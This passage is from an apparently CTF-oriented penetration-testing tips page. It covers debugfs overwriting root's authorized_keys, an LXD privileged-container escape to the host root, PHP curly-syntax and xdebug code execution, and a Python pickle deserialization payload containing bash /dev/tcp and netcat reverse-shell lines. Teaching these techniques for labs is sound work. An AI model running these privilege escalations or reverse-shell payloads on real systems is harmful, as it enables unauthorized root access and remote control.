+<p>It’s important to sync afterwards:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ sync
+</pre></div>
+</div>
+<p>Read again to check if the file was overwritten</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+</pre></div>
+</div>
+<p>More usage details about can be found at <a class="reference external" href="https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html">debugfs Command Examples</a></p>
+<section id="set-file-system">
+<h4>Set file system<a class="headerlink" href="#set-file-system" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&gt;</span> <span class="n">debugfs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">hda6</span>
+<span class="n">debugfs</span> <span class="mf">1.19</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Jul</span><span class="o">-</span><span class="mi">2000</span> <span class="k">for</span> <span class="n">EXT2</span> <span class="n">FS</span> <span class="mf">0.5</span><span class="n">b</span><span class="p">,</span> <span class="mi">95</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">09</span>
+</pre></div>
+</div>
+</section>
+<section id="list-files">
+<h4>List files<a class="headerlink" href="#list-files" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span>  <span class="n">ls</span>
+<span class="mi">2790777</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">.</span>   <span class="mi">32641</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">..</span>   <span class="mi">2790778</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="n">dir1</span>   <span class="mi">2790781</span> <span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="n">file1</span>
+<span class="mi">2790782</span> <span class="p">(</span><span class="mi">4044</span><span class="p">)</span> <span class="n">file2</span>
+</pre></div>
+</div>
+</section>
+<section id="list-the-files-with-a-long-listing">
+<h4>List the files with a long listing<a class="headerlink" href="#list-the-files-with-a-long-listing" title="Link to this heading"></a></h4>
+<p>Format is:</p>
+<ul class="simple">
+<li><p>Field 1:  Inode number.</p></li>
+<li><p>Field 2:  First one or two digits is the type of node:</p></li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li><p>2 = Character device</p></li>
+<li><p>4 = Directory</p></li>
+<li><p>6 = Block device</p></li>
+<li><p>10 = Regular file</p></li>
+<li><p>12 = Symbolic link</p></li>
+<li><p>The Last four digits are the Linux permissions</p></li>
+</ul>
+</div></blockquote>
+<ul class="simple">
+<li><p>Field 3: Owner uid</p></li>
+<li><p>Field 4: Group gid</p></li>
+<li><p>Field 5: Size in bytes.</p></li>
+<li><p>Field 6: Date</p></li>
+<li><p>Field 7: Time of last creation.</p></li>
+<li><p>Field 8: Filename.</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span>  <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<span class="mi">2790777</span>  <span class="mi">40700</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">30</span> <span class="o">.</span>
+ <span class="mi">32641</span>   <span class="mi">40755</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">14</span><span class="p">:</span><span class="mi">25</span> <span class="o">..</span>
+<span class="mi">2790778</span>  <span class="mi">40700</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="n">dir1</span>
+<span class="mi">2790781</span> <span class="mi">100600</span>   <span class="mi">2605</span>   <span class="mi">2601</span>      <span class="mi">14</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">29</span> <span class="n">file1</span>
+<span class="mi">2790782</span> <span class="mi">100600</span>   <span class="mi">2605</span>   <span class="mi">2601</span>      <span class="mi">14</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">30</span> <span class="n">file2</span>
+</pre></div>
+</div>
+</section>
+<section id="dump-the-contents-of-file1">
+<h4>Dump the contents of file1<a class="headerlink" href="#dump-the-contents-of-file1" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span> <span class="n">cat</span> <span class="n">file1</span>
+<span class="n">This</span> <span class="ow">is</span> <span class="n">file1</span>
+</pre></div>
+</div>
+</section>
+<section id="dump-an-inode-to-a-file">
+<h4>Dump an inode to a file<a class="headerlink" href="#dump-an-inode-to-a-file" title="Link to this heading"></a></h4>
+<p>Same as cat, but to a file and using inode number instead of the file name.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span> <span class="n">dump</span> <span class="o">&lt;</span><span class="mi">2790782</span><span class="o">&gt;</span> <span class="n">file1</span><span class="o">-</span><span class="n">debugfs</span>
+</pre></div>
+</div>
+<p>The above will copy the file to your file-system, useful when the flag is not in a text file and is in the jpg file or somethingelse.</p>
+</section>
+</section>
+<section id="lxd">
+<h3>LXD<a class="headerlink" href="#lxd" title="Link to this heading"></a></h3>
+<p>The below has been taken from <a class="reference external" href="https://reboare.github.io/lxd/lxd-escape.html">LXD-Escape</a></p>
+<p>LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.</p>
+<section id="exploiting">
+<h4>Exploiting<a class="headerlink" href="#exploiting" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true
+Creating test
+
+ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
+Device whatever added to test
+
+ubuntu@ubuntu:~$ lxc start test
+ubuntu@ubuntu:~$ lxc exec test bash
+</pre></div>
+</div>
+<p>Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc exec test bash
+root@test:~# cd /mnt/root
+root@test:/mnt/root# ls
+bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var
+boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+
+root@test:/mnt/root# cd root
+root@test:/mnt/root/root# ls
+root@test:/mnt/root/root# touch ICanDoWhatever
+root@test:/mnt/root/root# exit
+exit
+</pre></div>
+</div>
+<p>At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.</p>
+</section>
+</section>
+</section>
+<section id="a5-coding-languages-tricks">
+<span id="id5"></span><h2>A5: Coding Languages Tricks<a class="headerlink" href="#a5-coding-languages-tricks" title="Link to this heading"></a></h2>
+<section id="python">
+<h3>Python<a class="headerlink" href="#python" title="Link to this heading"></a></h3>
+<section id="pickle">
+<h4>Pickle<a class="headerlink" href="#pickle" title="Link to this heading"></a></h4>
+<p>If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>The pickle website say <em>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</em></p>
+<p>we may use</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Shell_code</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;/bin/bash -i &gt;&amp; /dev/tcp/&quot;Client IP&quot;/&quot;Listening PORT&quot; 0&gt;&amp;1&#39;</span><span class="p">,))</span>
+   <span class="ow">or</span>   <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;</span><span class="p">,))</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Shell_code</span><span class="p">())</span>
+</pre></div>
+</div>
+<p>if we print shell variable above, it would look something like below if python version 2 is used</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cposix</span>
+<span class="n">system</span>
+<span class="n">p1</span>
+<span class="p">(</span><span class="n">S</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;</span>
+<span class="n">p2</span>
+<span class="n">tp3</span>
+<span class="n">Rp4</span>
+<span class="o">.</span>
+</pre></div>
+</div>
+<p>and in python version 3</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x03</span><span class="s1">cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">XT</span><span class="se">\x00\x00\x00</span><span class="s1">/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/fq</span><span class="se">\x01\x85</span><span class="s1">q</span><span class="se">\x02</span><span class="s1">Rq</span><span class="se">\x03</span><span class="s1">.&#39;</span>
+</pre></div>
+</div>
+<p>Pickle is imported in python 3 as</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">_pickle</span> <span class="k">as</span> <span class="nn">cPickle</span>
+</pre></div>
+</div>
+<p>and in python 2</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">cPickle</span>
+</pre></div>
+</div>
+<p>Now, we can test locally that our code for shell is working by unpickling by</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#data.txt containing our Pickled data</span>
+<span class="kn">import</span> <span class="nn">cPickle</span>
+<span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;/tmp/data.txt&quot;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Refer <a class="reference external" href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely</a> , <a class="reference external" href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">Sour Pickles</a> and <a class="reference external" href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Exploiting misuse of Python’s “pickle”</a></p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.</p>
+</div>
+</section>
+</section>
+<section id="php">
+<h3>PHP<a class="headerlink" href="#php" title="Link to this heading"></a></h3>
+<section id="preg-replace">
+<h4>Preg_Replace<a class="headerlink" href="#preg-replace" title="Link to this heading"></a></h4>
+<p>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a> Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.</p>
+</section>
+<section id="complex-curly-syntax">
+<h4>Complex Curly Syntax<a class="headerlink" href="#complex-curly-syntax" title="Link to this heading"></a></h4>
+<p>PHP has <a class="reference external" href="http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a> The Complex Syntax to allow evaluation of our own code in double quotes.</p>
+<p>Example</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$use_me = &quot;ls -lah&quot;
+{${system($use_me)}}
+</pre></div>
+</div>
+<p>This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).</p>
+</section>
+<section id="xdebug">
+<h4>Xdebug<a class="headerlink" href="#xdebug" title="Link to this heading"></a></h4>
+<p>If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer <a class="reference external" href="https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/">xpwn - exploiting xdebug enabled servers</a>  and <a class="reference external" href="https://github.com/gteissier/xdebug-shell">xdebug-shell</a></p>
+</section>
+<section id="type-juggling-magic-bytes">
+<h4>Type Juggling/ Magic Bytes<a class="headerlink" href="#type-juggling-magic-bytes" title="Link to this heading"></a></h4>
+<p>Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at <a class="reference external" href="http://php.net/manual/en/language.operators.comparison.php">Language Operators Comparison</a></p>
+<p><em>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.</em></p>
+<p>So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.</p>
+<p>Refer <a class="reference external" href="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashes</a>, <a class="reference external" href="https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#">PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing</a> and <a class="reference external" href="http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Writing Exploits For Exotic Bug Classes:
+PHP Type Juggling</a></p>
+</section>
+</section>
+<section id="lua">
+<h3>LUA<a class="headerlink" href="#lua" title="Link to this heading"></a></h3>
+<p>In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is <a class="reference external" href="http://seclists.org/fulldisclosure/2014/May/128">Lua Web Application Security Vulnerabilities</a></p>
+</section>
+</section>
+<section id="a6-metasploit-module-writing">
+<h2>A6: Metasploit Module Writing?<a class="headerlink" href="#a6-metasploit-module-writing" title="Link to this heading"></a></h2>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This section is still under progress.</p>
+</div>
+<ul>
+<li><p>Creating a new module? create it in your home directory</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mkdir -p $HOME/.msf4/modules/exploits
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>If you are using auxiliary or post modules, or are writing payloads you’ll want to mkdir those as well.</p>
+</div></blockquote>
+<ul>
+<li><p>Made some changes and want metasploit to pick up those changes? use</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">reload_all</span>
+</pre></div>
+</div>
+</li>
+<li><p>Refer <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules">Loading External Modules</a> for the above two points.</p></li>
+<li><p>Want to edit a module or see the source code of it ? use edit in msfconsole (after selecting the module i.e use module_name)</p></li>
+<li><p>Want to write some variable value (like the payload/ mof file) to a file? use</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">File</span><span class="o">.</span><span class="n">Write</span><span class="p">(</span><span class="s1">&#39;/path/to/file&#39;</span><span class="p">,</span> <span class="s1">&#39;Some glorious content&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Refer <a class="reference external" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/">Documentation for rapid7/metasploit-framework</a></p></li>
+<li><p>Refer <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows">How to use WbemExec for a write privilege attack on Windows</a> and <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit">How to get started with writing an exploit</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="LFC-VM-P3-TipsAndTricks.html" class="btn btn-neutral float-left" title="Tips and Tricks" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html" class="btn btn-neutral float-right" title="Binary Exploitation" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
+  </div>
+
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(false);
+      });
+  </script> 
+
+</body>
+</html>
